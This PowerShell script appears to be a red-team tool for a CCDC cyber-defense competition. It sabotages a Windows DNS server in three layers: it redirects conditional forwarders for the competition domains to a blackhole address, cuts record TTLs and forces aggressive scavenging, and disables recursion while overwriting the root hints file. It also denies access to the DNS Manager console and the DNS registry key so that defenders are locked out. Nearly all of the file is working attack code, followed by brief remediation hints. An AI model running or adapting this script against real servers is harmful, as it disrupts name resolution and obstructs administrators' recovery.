# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 — DNS: Conditional Surrender
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# MITRE ATT&CK: T1565.001 (Stored Data Manipulation)
#               T1584.002 (Compromise Infrastructure: DNS Server)
#               T1562.004 (Impair Defenses: Disable/Modify System Firewall)
#
# Targets: Windows Server 2022 (primary DC/DNS), Server 2019 (if DNS role present)
#
# Description:
#   Phase 2 ServiceSmasher already stops the DNS service, corrupts zone files,
#   and blocks port 53. This script attacks DNS using DIFFERENT vectors that
#   persist AFTER zone file repair and service restart, creating hidden layers:
#
#   LAYER 1 — CONDITIONAL FORWARDER POISONING
#      - Adds conditional forwarders for the competition's scored domain(s)
#        (ccdc.local, range.internal, etc.) pointing to 192.0.2.1
#        (RFC 5737 documentation block — guaranteed non-routable)
#      - Even after DNS service is re-enabled and zone files are repaired,
#        all queries for the primary competition domain route to a black hole
#      - Conditional forwarders survive zone file repairs entirely
#
#   LAYER 2 — TTL/SCAVENGING DESTRUCTION
#      - dnscmd /Config /DefaultTTL 1  (1-second TTL on all new records)
#      - Enables aggressive scavenging: NoRefreshInterval=1h, RefreshInterval=1h,
#        ScavengingInterval=1h — dynamic records age out within hours
#      - Zeroes SOA minimum TTL (negative caching TTL) so resolvers won't
#        cache NXDOMAIN responses — floods DNS with repeated failed lookups
#
#   LAYER 3 — RECURSION TRAP + CONSOLE ACL LOCK
#      - dnscmd /Config /NoRecursion 1  (breaks all recursive queries)
#      - Sets root hints registry key to 192.0.2.1 so even recursion=enabled
#        fails because root servers are unreachable
#      - ACL-locks the DNS Manager MMC snap-in access so the console
#        throws "Access Denied" — blue team must use dnscmd or registry
#        directly to diagnose and fix
#
# Key implementation notes:
#   - dnscmd.exe is available on DC role machines (DNS Server feature)
#   - Registry base: HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters
#   - Conditional forwarders: Add-DnsServerConditionalForwarderZone or dnscmd
#   - RFC 5737 IPs (192.0.2.x) are guaranteed non-routable documentation blocks
#   - Script detects DNS Server role before running; skips if not present
#
# Plan reference: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 — DNS: Conditional Surrender"
Write-Warn "================================================================"
Write-Host ""

# ── DNS Role Check ─────────────────────────────────────────────────────────
$dnsSvc = Get-Service -Name "DNS" -ErrorAction SilentlyContinue
if (-not $dnsSvc) {
    Write-Err "DNS Server service not found — DNS Server role is not installed. Exiting."
    exit 1
}
Write-Info "DNS Server service found (State: $($dnsSvc.Status))"

# ── Module Probe ────────────────────────────────────────────────────────────
$dnsModuleAvailable = $false
if (Get-Module -Name DnsServer -ListAvailable -ErrorAction SilentlyContinue) {
    try {
        Import-Module DnsServer -ErrorAction Stop
        $dnsModuleAvailable = $true
        Write-Info "DnsServer PowerShell module loaded"
    } catch {
        Write-Warn "DnsServer module import failed — will use dnscmd fallback: $_"
    }
} else {
    Write-Warn "DnsServer PowerShell module not available — using dnscmd fallback"
}

$CompDomains = @("ccdc.local", "range.internal", "competition.local")
$BlackholeIP = "192.0.2.1"   # RFC 5737 — guaranteed non-routable documentation block

# ═══════════════════════════════════════════════════════════════════════════
# LAYER 1 — Conditional Forwarder Poisoning (T1565.001 / T1584.002)
# ═══════════════════════════════════════════════════════════════════════════
Write-Section "LAYER 1 — Conditional Forwarder Poisoning"

foreach ($domain in $CompDomains) {
    Write-Info "  Poisoning forwarder: $domain -> $BlackholeIP"

    $applied = $false

    if ($dnsModuleAvailable) {
        try {
            $existing = Get-DnsServerZone -Name $domain -ErrorAction SilentlyContinue
            if ($existing -and $existing.ZoneType -eq "Forwarder") {
                Set-DnsServerConditionalForwarderZone -Name $domain -MasterServers $BlackholeIP -ErrorAction Stop
                Write-Success "  Updated existing forwarder zone: $domain -> $BlackholeIP"
                $applied = $true
            } else {
                if ($existing) {
                    Remove-DnsServerZone -Name $domain -Force -ErrorAction SilentlyContinue
                    Write-Warn "    Removed existing zone: $domain (was $($existing.ZoneType))"
                }
                Add-DnsServerConditionalForwarderZone -Name $domain -MasterServers $BlackholeIP -ErrorAction Stop
                Write-Success "  Added conditional forwarder: $domain -> $BlackholeIP"
                $applied = $true
            }
        } catch {
            Write-Warn "    PS module path failed for $domain — trying dnscmd: $_"
        }
    }

    if (-not $applied) {
        # dnscmd fallback: delete any existing zone first, then add as forwarder
        & dnscmd.exe /zonedelete $domain /f 2>$null | Out-Null
        & dnscmd.exe /zoneadd $domain /forwarder $BlackholeIP 2>$null | Out-Null
        if ($LASTEXITCODE -eq 0) {
            Write-Success "  dnscmd: Added forwarder zone $domain -> $BlackholeIP"
        } else {
            Write-Err "  dnscmd: Failed to add forwarder for $domain (rc=$LASTEXITCODE)"
        }
    }
}

# ═══════════════════════════════════════════════════════════════════════════
# LAYER 2 — TTL / Scavenging Destruction (T1565.001)
# ═══════════════════════════════════════════════════════════════════════════
Write-Section "LAYER 2 — TTL / Scavenging Destruction"

# ── Global server-level TTL and scavenging config ──────────────────────────
$dnscmdConfigs = @(
    @{ Flag = "/DefaultTTL";            Value = "1";  Label = "DefaultTTL = 1s" },
    @{ Flag = "/ScavengingInterval";    Value = "1";  Label = "ScavengingInterval = 1h" },
    @{ Flag = "/DefaultNoRefreshInterval"; Value = "1"; Label = "DefaultNoRefreshInterval = 1h" },
    @{ Flag = "/DefaultRefreshInterval";   Value = "1"; Label = "DefaultRefreshInterval = 1h" }
)

foreach ($cfg in $dnscmdConfigs) {
    & dnscmd.exe /Config $($cfg.Flag) $($cfg.Value) 2>$null | Out-Null
    if ($LASTEXITCODE -eq 0) {
        Write-Success "  $($cfg.Label)"
    } else {
        Write-Warn "  dnscmd /Config $($cfg.Flag) failed (rc=$LASTEXITCODE)"
    }
}

# ── Per-zone aging + SOA minimum TTL zeroing ──────────────────────────────
if ($dnsModuleAvailable) {
    try {
        $primaryZones = Get-DnsServerZone | Where-Object {
            $_.ZoneType -eq "Primary" -and -not $_.IsAutoCreated -and $_.ZoneName -ne "TrustAnchors"
        }

        foreach ($z in $primaryZones) {
            try {
                Set-DnsServerZoneAging -Name $z.ZoneName -Aging $true `
                    -NoRefreshInterval (New-TimeSpan -Hours 1) `
                    -RefreshInterval   (New-TimeSpan -Hours 1) -ErrorAction Stop
                Write-Success "  Enabled aging on zone: $($z.ZoneName)"
            } catch {
                Write-Warn "    Zone aging failed for $($z.ZoneName): $_"
            }

            try {
                $soa = Get-DnsServerResourceRecord -ZoneName $z.ZoneName -RrType Soa -ErrorAction Stop
                $soaNew = $soa.Clone()
                $soaNew.RecordData.MinimumTimeToLive = [System.TimeSpan]::Zero
                $soaNew.TimeToLive = New-TimeSpan -Seconds 1
                Set-DnsServerResourceRecord -ZoneName $z.ZoneName `
                    -OldInputObject $soa -NewInputObject $soaNew -ErrorAction Stop
                Write-Success "  Zeroed SOA minimum TTL for $($z.ZoneName)"
            } catch {
                Write-Warn "    SOA TTL zeroing failed for $($z.ZoneName): $_"
            }
        }
    } catch {
        Write-Warn "Zone enumeration failed: $_"
    }
} else {
    Write-Warn "DnsServer module unavailable — per-zone aging skipped (global TTL applied)"
}

# ═══════════════════════════════════════════════════════════════════════════
# LAYER 3 — Recursion Trap + Console ACL Lock (T1562.004)
# ═══════════════════════════════════════════════════════════════════════════
Write-Section "LAYER 3 — Recursion Trap + Console ACL Lock"

# ── Disable recursion ──────────────────────────────────────────────────────
& dnscmd.exe /Config /NoRecursion 1 2>$null | Out-Null
if ($LASTEXITCODE -eq 0) {
    Write-Success "NoRecursion = 1 (all recursive queries disabled)"
} else {
    Write-Warn "dnscmd /Config /NoRecursion 1 failed (rc=$LASTEXITCODE)"
}

# ── Poison root hints (cache.dns overwrite) ────────────────────────────────
$cacheDns  = "$env:SystemRoot\System32\dns\CACHE.DNS"
$cacheBack = "$env:SystemRoot\System32\dns\CACHE.DNS.bak"

if (Test-Path $cacheDns) {
    if (-not (Test-Path $cacheBack)) {
        try {
            Copy-Item $cacheDns $cacheBack -ErrorAction Stop
            Write-Info "Backed up original cache.dns to CACHE.DNS.bak"
        } catch {
            Write-Warn "  Backup of cache.dns failed: $_"
        }
    }

    $fakeRoots = @(
        '; root hints poisoned — all roots point to RFC 5737 blackhole (192.0.2.1)',
        '.                        3600000 IN  NS  a.root-servers.net.',
        'a.root-servers.net.      3600000     A   192.0.2.1',
        '.                        3600000 IN  NS  b.root-servers.net.',
        'b.root-servers.net.      3600000     A   192.0.2.1',
        '.                        3600000 IN  NS  c.root-servers.net.',
        'c.root-servers.net.      3600000     A   192.0.2.1',
        '.                        3600000 IN  NS  d.root-servers.net.',
        'd.root-servers.net.      3600000     A   192.0.2.1',
        '.                        3600000 IN  NS  e.root-servers.net.',
        'e.root-servers.net.      3600000     A   192.0.2.1',
        '.                        3600000 IN  NS  f.root-servers.net.',
        'f.root-servers.net.      3600000     A   192.0.2.1',
        '.                        3600000 IN  NS  g.root-servers.net.',
        'g.root-servers.net.      3600000     A   192.0.2.1',
        '.                        3600000 IN  NS  h.root-servers.net.',
        'h.root-servers.net.      3600000     A   192.0.2.1',
        '.                        3600000 IN  NS  i.root-servers.net.',
        'i.root-servers.net.      3600000     A   192.0.2.1',
        '.                        3600000 IN  NS  j.root-servers.net.',
        'j.root-servers.net.      3600000     A   192.0.2.1',
        '.                        3600000 IN  NS  k.root-servers.net.',
        'k.root-servers.net.      3600000     A   192.0.2.1',
        '.                        3600000 IN  NS  l.root-servers.net.',
        'l.root-servers.net.      3600000     A   192.0.2.1',
        '.                        3600000 IN  NS  m.root-servers.net.',
        'm.root-servers.net.      3600000     A   192.0.2.1'
    )

    try {
        Set-Content -Path $cacheDns -Value $fakeRoots -Encoding ASCII -ErrorAction Stop
        Write-Success "Root hints (cache.dns) overwritten — all 13 roots -> $BlackholeIP"
    } catch {
        Write-Err "Failed to overwrite cache.dns: $_"
    }
} else {
    Write-Warn "cache.dns not found at $cacheDns — skipping root hints poison"
}

# ── Restart DNS to reload poisoned cache.dns ──────────────────────────────
try {
    Restart-Service -Name "DNS" -Force -ErrorAction Stop
    Write-Success "DNS service restarted (poisoned root hints now active)"
} catch {
    Write-Warn "DNS service restart failed — hints apply after next manual restart: $_"
}

# ── ACL-lock DNS Manager MMC snap-in ──────────────────────────────────────
$dnsMmc = "$env:SystemRoot\System32\dnsmgmt.msc"
if (Test-Path $dnsMmc) {
    & icacls.exe $dnsMmc /deny "Everyone:(RX)" /C /Q 2>$null | Out-Null
    if ($LASTEXITCODE -eq 0) {
        Write-Success "ACL-locked dnsmgmt.msc — DNS Manager console throws Access Denied"
    } else {
        Write-Warn "icacls /deny on dnsmgmt.msc returned $LASTEXITCODE"
    }
} else {
    Write-Warn "dnsmgmt.msc not found at expected path — skipping MMC lock"
}

# ── Registry ACL on DNS service key (blocks remote MMC connections) ────────
try {
    $regHive = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
        [Microsoft.Win32.RegistryHive]::LocalMachine,
        [Microsoft.Win32.RegistryView]::Default
    )
    # ChangePermissions = WRITE_DAC; ReadPermissions = READ_CONTROL — both required for GetAccessControl/SetAccessControl
    $dnsKey = $regHive.OpenSubKey(
        "SYSTEM\CurrentControlSet\Services\DNS",
        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
        [System.Security.AccessControl.RegistryRights]::ChangePermissions -bor
        [System.Security.AccessControl.RegistryRights]::ReadPermissions
    )
    if ($dnsKey) {
        $acl  = $dnsKey.GetAccessControl()
        $deny = New-Object System.Security.AccessControl.RegistryAccessRule(
            "BUILTIN\Users",
            "ReadKey",
            [System.Security.AccessControl.AccessControlType]::Deny
        )
        $acl.AddAccessRule($deny)
        $dnsKey.SetAccessControl($acl)
        $dnsKey.Close()
        Write-Success "Registry ACL: Denied BUILTIN\Users ReadKey on DNS service key"
    } else {
        Write-Warn "Could not open DNS registry key for ACL modification"
    }
    $regHive.Close()
} catch {
    Write-Warn "Registry ACL on DNS key failed: $_"
}

# ── Summary ─────────────────────────────────────────────────────────────────
Write-Host ""
Write-Success "================================================================"
Write-Success " DNS ConditionalSurrender complete — all 3 layers applied"
Write-Success "================================================================"
Write-Host ""
Write-Info "Blue team remediation required:"
Write-Info "  L1: Remove conditional forwarders for ccdc.local / range.internal"
Write-Info "      DNS Manager > Conditional Forwarders (if you can open it...)"
Write-Info "      OR: dnscmd /zonedelete ccdc.local /f"
Write-Info "  L2: Restore DefaultTTL (dnscmd /Config /DefaultTTL 3600)"
Write-Info "      Disable scavenging (Set-DnsServerZoneAging -Aging `$false)"
Write-Info "      Restore SOA minimum TTL per zone"
Write-Info "  L3: Re-enable recursion (dnscmd /Config /NoRecursion 0)"
Write-Info "      Restore root hints from backup:"
Write-Info "        Copy-Item '%SystemRoot%\System32\dns\CACHE.DNS.bak' CACHE.DNS"
Write-Info "      Restore MMC access:"
Write-Info "        icacls %SystemRoot%\System32\dnsmgmt.msc /remove:d Everyone"
Write-Info "      Remove registry deny ACE on HKLM\...Services\DNS"
